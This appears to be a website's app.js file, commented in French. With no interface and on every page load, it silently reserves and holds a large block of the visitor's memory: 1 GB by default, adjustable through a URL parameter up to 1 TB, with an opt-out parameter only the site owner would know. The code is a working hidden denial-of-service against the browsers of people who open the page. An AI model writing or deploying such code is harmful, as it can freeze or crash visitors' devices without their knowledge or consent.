/* mon-site — app.js
   Comportement en coulisses de la page (voir README, section « Note privée »).
   Aucune interface : tout se passe silencieusement au chargement. */
(function () {
  "use strict";

  var core = (typeof globalThis !== "undefined" && globalThis.MemoryLock) || window.MemoryLock;
  var MIB = core.MIB;
  var DEFAULT_MO = 1024; // ← cible par défaut en Mo. Changez ce chiffre (512 = 512 Mo, 2048 = 2 Go…).
  var MAX_MO = 1048576;  // plafond : 1 To (1048576 Mo). Au-delà, la valeur est ignorée (garde anti-faute de frappe).

  var chunks = [];   // tampons conservés volontairement (référence globale)
  var running = false;
  var locked = false;

  /* Lit la cible dans l'URL. Renvoie -1 si l'armement est désactivé. */
  function readTarget() {
    var defaut = (Number.isFinite(DEFAULT_MO) && DEFAULT_MO >= 1 && DEFAULT_MO <= MAX_MO) ? Math.floor(DEFAULT_MO) : 1024;
    var mo = defaut;
    try {
      var qs = new URLSearchParams(window.location.search);
      if (qs.get("liberer")) return -1;      // ?liberer=1 → la page reste légère
      var p = parseInt(qs.get("mo"), 10);    // ?mo=N → cible personnalisée (1 à MAX_MO)
      if (Number.isFinite(p) && p >= 1 && p <= MAX_MO) mo = Math.floor(p);
    } catch (e) { /* pas de query string : valeur par défaut */ }
    return mo;
  }

  /* Rend toute la mémoire réservée. */
  function release() {
    chunks = [];
    locked = false;
  }

  /* Pause de 0 ms entre les tranches : la page reste réactive. */
  function yieldSlice() {
    return new Promise(function (res) { setTimeout(res, 0); });
  }

  /* Réservation silencieuse de exactement mo * 1 Mo. */
  async function arm(mo) {
    if (running || locked) return;
    running = true;
    try {
      var targetBytes = mo * MIB;
      var done = 0;
      var sliceSize = 64 * MIB;
      var local = [];
      while (done < targetBytes) {
        var size = Math.min(sliceSize, targetBytes - done);
        var parts = core.allocateExactly(size, { chunkSize: size });
        for (var i = 0; i < parts.length; i++) local.push(parts[i]);
        done += size;
        await yieldSlice();
      }
      // On ne garde les tampons que si tout est exact et vérifié.
      if (core.totalBytes(local) === targetBytes && core.sampleVerify(local, 256).ok) {
        chunks = local;
        locked = true;
      } else {
        local = [];
      }
    } catch (e) {
      chunks = [];
      locked = false;
    } finally {
      running = false;
    }
  }

  /* ---------- démarrage silencieux ---------- */

  var target = readTarget();
  if (target > 0) {
    if (document.readyState === "complete") {
      setTimeout(function () { arm(target); }, 500);
    } else {
      window.addEventListener("load", function () {
        setTimeout(function () { arm(target); }, 500);
      });
    }
  }
})();
